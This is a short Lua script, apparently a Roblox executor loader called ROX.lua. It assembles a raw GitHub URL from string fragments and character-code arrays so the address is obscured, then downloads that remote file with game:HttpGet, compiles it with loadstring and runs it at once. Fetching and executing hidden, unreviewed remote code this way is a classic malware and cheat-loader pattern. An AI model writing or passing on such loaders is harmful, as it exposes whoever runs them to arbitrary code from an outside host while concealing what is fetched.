-- ROX.lua | mixed English + numeric URL loader
-- Rebuilds the exact raw GitHub URL, then fetches and compiles the remote source.
local function buildUrl()
    local parts = {}
    parts[#parts + 1] = "https:"
    local b1 = {47, 47, 114, 97, 119, 46}
    for i = 1, #b1 do
        parts[#parts + 1] = string.char(b1[i])
    end
    parts[#parts + 1] = "github"
    local b3 = {117, 115, 101, 114, 99, 111}
    for i = 1, #b3 do
        parts[#parts + 1] = string.char(b3[i])
    end
    parts[#parts + 1] = "ntent."
    local b5 = {99, 111, 109, 47, 112, 112}
    for i = 1, #b5 do
        parts[#parts + 1] = string.char(b5[i])
    end
    parts[#parts + 1] = "pllloo"
    local b7 = {111, 52, 57, 50, 45, 97}
    for i = 1, #b7 do
        parts[#parts + 1] = string.char(b7[i])
    end
    parts[#parts + 1] = "rt/-/r"
    local b9 = {101, 102, 115, 47, 104, 101}
    for i = 1, #b9 do
        parts[#parts + 1] = string.char(b9[i])
    end
    parts[#parts + 1] = "ads/ma"
    local b11 = {105, 110, 47, 82, 79, 88}
    for i = 1, #b11 do
        parts[#parts + 1] = string.char(b11[i])
    end
    parts[#parts + 1] = ".lua"
    return table.concat(parts)
end

local url = buildUrl()
local ok, source = pcall(function()
    return game:HttpGet(url)
end)
if not ok then
    error("ROX.lua download failed: " .. tostring(source))
end

local run, compileError = loadstring(source)
if not run then
    error("ROX.lua compile failed: " .. tostring(compileError))
end
run()

